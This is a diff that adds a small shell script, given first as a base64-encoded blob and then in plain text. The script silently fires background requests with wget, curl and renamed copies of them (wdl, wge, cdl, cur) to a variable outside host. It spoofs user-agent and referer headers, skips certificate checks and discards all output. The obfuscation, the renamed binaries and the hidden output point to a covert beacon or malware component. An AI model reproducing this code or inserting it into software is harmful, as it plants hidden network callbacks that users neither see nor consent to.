@@ -1,0 +1,22 @@
+aWYgdHlwZSB3Z2V0ID4vZGV2L251bGw7IHRoZW4Kbm9odXAgd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIC0tdXNlci1hZ2VudD0id2dldCAkVEhFVVNSQSIgLS1yZWZlcmVyPSIkVEhFUkVGRSIgLXMgJFRIRUxJTksgLU8gL2Rldi9udWxsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsICYKZmkKaWYgdHlwZSB3ZGwgPi9kZXYvbnVsbDsgdGhlbgpub2h1cCB3ZGwgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtLXVzZXItYWdlbnQ9IndkbCAkVEhFVVNSQSIgLS1yZWZlcmVyPSIkVEhFUkVGRSIgLXMgJFRIRUxJTksgLU8gL2Rldi9udWxsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsICYKZmkKaWYgdHlwZSB3Z2UgPi9kZXYvbnVsbDsgdGhlbgpub2h1cCB3Z2UgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtLXVzZXItYWdlbnQ9IndnZSAkVEhFVVNSQSIgLS1yZWZlcmVyPSIkVEhFUkVGRSIgLXMgJFRIRUxJTksgLU8gL2Rldi9udWxsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsICYKZmkKCmlmIHR5cGUgY3VybCA+L2Rldi9udWxsOyB0aGVuCm5vaHVwIGN1cmwgLS11c2VyLWFnZW50ICJjdXJsICRUSEVVU1JBIiAtLXJlZmVyZXIgIiRUSEVSRUZFIiAtcyAkVEhFTElOSyAtbyAvZGV2L251bGwgMj4vZGV2L251bGwgMT4vZGV2L251bGwgJgpmaQppZiB0eXBlIGNkbCA+L2Rldi9udWxsOyB0aGVuCm5vaHVwIGNkbCAtLXVzZXItYWdlbnQgImNkbCAkVEhFVVNSQSIgLS1yZWZlcmVyICIkVEhFUkVGRSIgLXMgJFRIRUxJTksgLW8gL2Rldi9udWxsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsICYKZmkKaWYgdHlwZSBjdXIgPi9kZXYvbnVsbDsgdGhlbgpub2h1cCBjdXIgLS11c2VyLWFnZW50ICJjZGwgJFRIRVVTUkEiIC0tcmVmZXJlciAiJFRIRVJFRkUiIC1zICRUSEVMSU5LIC1vIC9kZXYvbnVsbCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCAmCmZp
+
+
+if type wget >/dev/null; then
+nohup wget --no-check-certificate --user-agent="wget $THEUSRA" --referer="$THEREFE" -s $THELINK -O /dev/null 2>/dev/null 1>/dev/null &
+fi
+if type wdl >/dev/null; then
+nohup wdl --no-check-certificate --user-agent="wdl $THEUSRA" --referer="$THEREFE" -s $THELINK -O /dev/null 2>/dev/null 1>/dev/null &
+fi
+if type wge >/dev/null; then
+nohup wge --no-check-certificate --user-agent="wge $THEUSRA" --referer="$THEREFE" -s $THELINK -O /dev/null 2>/dev/null 1>/dev/null &
+fi
+
+if type curl >/dev/null; then
+nohup curl --user-agent "curl $THEUSRA" --referer "$THEREFE" -s $THELINK -o /dev/null 2>/dev/null 1>/dev/null &
+fi
+if type cdl >/dev/null; then
+nohup cdl --user-agent "cdl $THEUSRA" --referer "$THEREFE" -s $THELINK -o /dev/null 2>/dev/null 1>/dev/null &
+fi
+if type cur >/dev/null; then
+nohup cur --user-agent "cdl $THEUSRA" --referer "$THEREFE" -s $THELINK -o /dev/null 2>/dev/null 1>/dev/null &
+fi
